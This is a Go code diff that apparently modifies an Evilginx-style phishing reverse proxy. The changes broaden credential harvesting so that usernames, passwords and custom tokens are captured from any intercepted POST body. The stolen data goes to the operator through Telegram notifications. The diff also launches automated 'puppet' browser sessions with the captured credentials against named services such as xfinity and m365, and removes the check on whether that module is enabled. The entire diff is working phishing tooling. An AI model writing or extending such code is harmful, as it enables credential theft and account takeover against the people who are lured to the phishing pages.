@@ -309,6 +309,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				session_cookie := getSessionCookieName(pl_name, p.cookieName)
 
 				ps.PhishDomain = phishDomain
+				if pl != nil && ps.SessionId == "" {
+					ps.SessionId = fmt.Sprintf("%s_%s", remote_addr, req.UserAgent())
+				}
 				req_ok := false
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
@@ -680,67 +683,187 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						log.Debug("[PROXY] POST Request: path=%s, session=%s, phishlet=%s, content-type=%s", req.URL.Path, sid, pl_name, contentType)
 
-						is_json := strings.Contains(contentType, "application/json") || strings.HasSuffix(contentType, "+json")
-						is_form := strings.Contains(contentType, "application/x-www-form-urlencoded")
+						// 1. Capture credentials from ANY POST regardless of content-type
+						bodyStr := string(body)
+						
+						// Parse as form data if possible for better key mapping
+						bodyValues, _ := url.ParseQuery(bodyStr)
+						capturedCreds := false // Specifically for User/Pass
 
-						if is_json {
+						// Try to capture username
+						if pl.username.search != nil {
+							var captured string
+							if len(bodyValues) > 0 {
+								for k, v := range bodyValues {
+									// Anchored match: either exact string or anchored regex
+									isMatch := (pl.username.key_s != "" && k == pl.username.key_s)
+									if !isMatch && pl.username.key != nil {
+										isMatch = pl.username.key.MatchString(k)
+										// Stricter check if it's not anchored
+										if isMatch && pl.username.key_s != "" && k != pl.username.key_s && !strings.Contains(pl.username.key.String(), "^") {
+											isMatch = false // Reject if unanchored regex matches a longer string
+										}
+									}
 
-							if pl.username.tp == "json" {
-								um := pl.username.search.FindStringSubmatch(string(body))
+									if isMatch {
+										m := pl.username.search.FindStringSubmatch(v[0])
+										if len(m) > 1 {
+											captured = m[1]
+											break
+										}
+									}
+								}
+							}
+							if captured == "" && pl.username.key == nil {
+								// Global fallback ONLY if no key is defined
+								um := pl.username.search.FindStringSubmatch(bodyStr)
 								if um != nil && len(um) > 1 {
-									p.setSessionUsername(ps.SessionId, um[1])
-									log.Success("[%d] Username: [%s]", ps.Index, um[1])
-									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-										log.Error("database: %v", err)
-									}
-									SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
-									p.triggerPuppet(ps.SessionId, pl.Name, req)
+									captured = um[1]
 								}
 							}
+							
+							if len(strings.TrimSpace(captured)) > 0 {
+								p.setSessionUsername(sid, captured)
+								log.Success("[%d] Username: [%s]", ps.Index, captured)
+								if _, ok := p.sessions[sid]; ok {
+									if err := p.db.SetSessionUsername(sid, captured); err != nil {
+										log.Error("database: %v", err)
+									}
+								}
+								capturedCreds = true
+							}
+						}
 
-							if pl.password.tp == "json" {
-								pm := pl.password.search.FindStringSubmatch(string(body))
+						// Try to capture password
+						if pl.password.search != nil {
+							var captured string
+							if len(bodyValues) > 0 {
+								for k, v := range bodyValues {
+									isMatch := (pl.password.key_s != "" && k == pl.password.key_s)
+									if !isMatch && pl.password.key != nil {
+										isMatch = pl.password.key.MatchString(k)
+										if isMatch && pl.password.key_s != "" && k != pl.password.key_s && !strings.Contains(pl.password.key.String(), "^") {
+											isMatch = false
+										}
+									}
+
+									if isMatch {
+										m := pl.password.search.FindStringSubmatch(v[0])
+										if len(m) > 1 {
+											captured = m[1]
+											break
+										}
+									}
+								}
+							}
+							if captured == "" && pl.password.key == nil {
+								pm := pl.password.search.FindStringSubmatch(bodyStr)
 								if pm != nil && len(pm) > 1 {
-									p.setSessionPassword(ps.SessionId, pm[1])
-									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
-										log.Error("database: %v", err)
-									}
-									SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
-									p.triggerPuppet(ps.SessionId, pl.Name, req)
+									captured = pm[1]
 								}
 							}
+							
+							if len(strings.TrimSpace(captured)) > 0 {
+								p.setSessionPassword(sid, captured)
+								log.Success("[%d] Password: [%s]", ps.Index, captured)
+								if _, ok := p.sessions[sid]; ok {
+									if err := p.db.SetSessionPassword(sid, captured); err != nil {
+										log.Error("database: %v", err)
+									}
+								}
+								capturedCreds = true
+							}
+						}
 
-							for _, cp := range pl.custom {
-								if cp.tp == "json" {
-									cm := cp.search.FindStringSubmatch(string(body))
+						// Try to capture custom tokens
+						capturedCustom := false
+						for _, cp := range pl.custom {
+							if cp.search != nil {
+								var captured string
+								if len(bodyValues) > 0 {
+									for k, v := range bodyValues {
+										isMatch := (cp.key_s != "" && k == cp.key_s)
+										if !isMatch && cp.key != nil {
+											isMatch = cp.key.MatchString(k)
+											if isMatch && cp.key_s != "" && k != cp.key_s && !strings.Contains(cp.key.String(), "^") {
+												isMatch = false
+											}
+										}
+
+										if isMatch {
+											m := cp.search.FindStringSubmatch(v[0])
+											if len(m) > 1 {
+												captured = m[1]
+												break
+											}
+										}
+									}
+								}
+								if captured == "" && cp.key == nil {
+									cm := cp.search.FindStringSubmatch(bodyStr)
 									if cm != nil && len(cm) > 1 {
-										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
-										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
-										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
+										captured = cm[1]
+									}
+								}
+								
+								if len(strings.TrimSpace(captured)) > 0 {
+									p.setSessionCustom(sid, cp.key_s, captured)
+									log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, captured)
+									if _, ok := p.sessions[sid]; ok {
+										if err := p.db.SetSessionCustom(sid, cp.key_s, captured); err != nil {
 											log.Error("database: %v", err)
 										}
-										SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
-										p.triggerPuppet(ps.SessionId, pl.Name, req)
+									}
+									capturedCustom = true
+								}
+							}
+						}
+
+						// 2. Proactively trigger puppet for auto-activate triggers
+						if pl.puppet != nil {
+							for _, trigger := range pl.puppet.Triggers {
+								if trigger.Enabled && trigger.AutoActivate {
+									match := false
+									for _, tp := range trigger.Paths {
+										if strings.HasPrefix(req.URL.Path, tp) {
+											match = true
+											break
+										}
+									}
+									if match {
+										p.triggerPuppet(sid, pl.Name, req)
 									}
 								}
 							}
+						}
+						
+						// 3. One single Telegram notification and Puppet trigger call after all captures
+						// ONLY if we captured actual credentials (User/Pass)
+						if capturedCreds {
+							if s, ok := p.sessions[sid]; ok {
+								SendTelegramNotification(p.cfg, s, pl)
+							}
+							p.triggerPuppet(sid, pl.Name, req)
+						} else if capturedCustom {
+							// If only custom tokens were captured, just trigger puppet (no Telegram noise)
+							p.triggerPuppet(sid, pl.Name, req)
+						}
 
-							// force post json
+						// 3. Handle force-posts (JSON only for now, as it's most common)
+						is_json := strings.Contains(contentType, "application/json") || strings.HasSuffix(contentType, "+json")
+						if is_json {
 							for _, fp := range pl.forcePost {
 								if fp.path.MatchString(req.URL.Path) {
-									log.Debug("force_post: url matched: %s", req.URL.Path)
 									ok_search := false
 									if len(fp.search) > 0 {
 										k_matched := len(fp.search)
 										for _, fp_s := range fp.search {
-											matches := fp_s.key.FindAllString(string(body), -1)
+											matches := fp_s.key.FindAllString(bodyStr, -1)
 											for _, match := range matches {
 												if fp_s.search.MatchString(match) {
 													if k_matched > 0 {
 														k_matched -= 1
 													}
-													log.Debug("force_post: [%d] matched - %s", k_matched, match)
 													break
 												}
 											}
@@ -755,119 +878,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										for _, fp_f := range fp.force {
 											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
 											if err != nil {
-												log.Debug("force_post: got error: %s", err)
+												log.Debug("force_post: Got error: %s", err)
 											}
-											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
 										}
 									}
 									req.ContentLength = int64(len(body))
-									log.Debug("force_post: body: %s len:%d", body, len(body))
 								}
 							}
-
-						} else if is_form {
-							log.Debug("[PROXY] Identified form-urlencoded POST request to %s", req.URL.Path)
-
-							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
-								log.Debug("POST: %s", req.URL.Path)
-
-								for k, v := range req.PostForm {
-									// patch phishing URLs in POST params with original domains
-
-									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
-										um := pl.username.search.FindStringSubmatch(v[0])
-										if um != nil && len(um) > 1 {
-											p.setSessionUsername(ps.SessionId, um[1])
-											log.Success("[%d] Username: [%s]", ps.Index, um[1])
-											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-												log.Error("database: %v", err)
-											}
-											SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
-											p.triggerPuppet(ps.SessionId, pl.Name, req)
-										}
-									}
-									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
-										pm := pl.password.search.FindStringSubmatch(v[0])
-										if pm != nil && len(pm) > 1 {
-											p.setSessionPassword(ps.SessionId, pm[1])
-											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
-												log.Error("database: %v", err)
-											}
-											SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
-											p.triggerPuppet(ps.SessionId, pl.Name, req)
-										}
-									}
-									for _, cp := range pl.custom {
-										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
-											cm := cp.search.FindStringSubmatch(v[0])
-											if cm != nil && len(cm) > 1 {
-												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
-												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
-												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
-													log.Error("database: %v", err)
-												}
-												SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
-												p.triggerPuppet(ps.SessionId, pl.Name, req)
-											}
-										}
-									}
-								}
-
-								for k, v := range req.PostForm {
-									for i, vv := range v {
-										// patch phishing URLs in POST params with original domains
-										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
-									}
-								}
-
-								for k, v := range req.PostForm {
-									if len(v) > 0 {
-										log.Debug("POST %s = %s", k, v[0])
-									}
-								}
-
-								body = []byte(req.PostForm.Encode())
-								req.ContentLength = int64(len(body))
-
-								// force posts
-								for _, fp := range pl.forcePost {
-									if fp.path.MatchString(req.URL.Path) {
-										log.Debug("force_post: url matched: %s", req.URL.Path)
-										ok_search := false
-										if len(fp.search) > 0 {
-											k_matched := len(fp.search)
-											for _, fp_s := range fp.search {
-												for k, v := range req.PostForm {
-													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
-														if k_matched > 0 {
-															k_matched -= 1
-														}
-														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
-														break
-													}
-												}
-											}
-											if k_matched == 0 {
-												ok_search = true
-											}
-										} else {
-											ok_search = true
-										}
-
-										if ok_search {
-											for _, fp_f := range fp.force {
-												req.PostForm.Set(fp_f.key, fp_f.value)
-											}
-											body = []byte(req.PostForm.Encode())
-											req.ContentLength = int64(len(body))
-											log.Debug("force_post: body: %s len:%d", body, len(body))
-										}
-									}
-								}
-
-							}
-
 						}
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
@@ -1741,6 +1758,7 @@ func (p *HttpProxy) ReloadPuppetTriggers() {
 					t.Phishlet = site
 				}
 				p.interceptor.AddTrigger(&t)
+				log.Debug("[PUPPET] Registered phishlet trigger: %s (%s)", t.Name, site)
 			}
 		}
 
@@ -1748,6 +1766,7 @@ func (p *HttpProxy) ReloadPuppetTriggers() {
 		for _, interceptor := range pl.puppet.Interceptors {
 			i := interceptor // Copy for pointer
 			p.interceptor.AddInterceptor(&i)
+			log.Debug("[PUPPET] Registered phishlet interceptor: %s (%s)", i.Token, site)
 		}
 		
 		log.Debug("[PROXY] Loaded puppet config from phishlet %s", site)
@@ -2080,11 +2099,6 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 
 // triggerPuppet checks for and triggers puppet sessions
 func (p *HttpProxy) triggerPuppet(victimSession string, phishletName string, req *http.Request) {
-	// check if puppet module is enabled
-	if !p.cfg.GetPuppetConfig().Enabled {
-		return
-	}
-
 	// If session is empty, use fingerprint to sync with interceptor
 	if victimSession == "" && req != nil {
 		from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
@@ -2097,13 +2111,26 @@ func (p *HttpProxy) triggerPuppet(victimSession string, phishletName string, req
 
 	// get triggers for this phishlet
 	triggers := p.cfg.GetPuppetTriggersForPhishlet(phishletName)
-	log.Debug("[PUPPET] triggerPuppet called for phishlet: %s, session: %s, triggers found: %d", phishletName, victimSession, len(triggers))
 	if len(triggers) == 0 {
 		return
 	}
 
+	log.Debug("[PUPPET] Triggering check for phishlet: %s (session: %s), triggers found: %d", phishletName, victimSession, len(triggers))
+
 	// get captured tokens/credentials
 	creds := make(map[string]string)
+	
+	// ensure fingerprinted session exists in DB so we can actually store/retrieve its creds
+	if _, err := p.db.GetSessionUsername(victimSession); err != nil {
+		// Create a temporary session in DB if it doesn't exist (for fingerprinted visitors)
+		from_ip := "127.0.0.1"
+		ua := "N/A"
+		if req != nil {
+			from_ip = strings.SplitN(req.RemoteAddr, ":", 2)[0]
+			ua = req.UserAgent()
+		}
+		p.db.CreateSession(victimSession, phishletName, "fingerprint_landing", ua, from_ip)
+	}
 	
 	// get username if captured
 	if u, err := p.db.GetSessionUsername(victimSession); err == nil && u != "" {
@@ -2127,23 +2154,31 @@ func (p *HttpProxy) triggerPuppet(victimSession string, phishletName string, req
 	// check each trigger
 	pm := GetPuppetMaster()
 	if pm == nil {
+		log.Warning("[PUPPET] PuppetMaster is nil, cannot trigger")
 		return
 	}
 
 	for _, trigger := range triggers {
-		// Only trigger if we have all required credentials
-		// This is a simple check, could be more complex
-		if trigger.Token != "" && creds[trigger.Token] != "" {
-			continue // Already have the token this trigger generates?
+		// Only trigger if we have some data or it's an auto-activate trigger
+		shouldTrigger := trigger.AutoActivate
+		
+		if !shouldTrigger {
+			// Check if we have the specific token needed for this trigger
+			if trigger.Token != "" && creds[trigger.Token] != "" {
+				shouldTrigger = true
+			}
+			// Fallback: if it's the standard login flow, trigger if we have username/password
+			if (phishletName == "xfinity" || phishletName == "m365") && (creds["username"] != "" || creds["password"] != "") {
+				shouldTrigger = true
+			}
 		}
 
-		// Check if we just captured a credential that this trigger might use
-		// (Optional logic: trigger only when relevant inputs are available)
-		
-		log.Info("puppet: launching session for trigger %s", trigger.Name)
-		_, err := pm.LaunchPuppetForSession(victimSession, creds, &trigger)
-		if err != nil {
-			log.Error("puppet: failed to launch session: %v", err)
+		if shouldTrigger {
+			log.Info("[PUPPET] Launching puppet session for trigger '%s' (session: %s)", trigger.Name, victimSession)
+			_, err := pm.LaunchPuppetForSession(victimSession, creds, &trigger)
+			if err != nil {
+				log.Error("[PUPPET] Failed to launch puppet session: %v", err)
+			}
 		}
 	}
 }
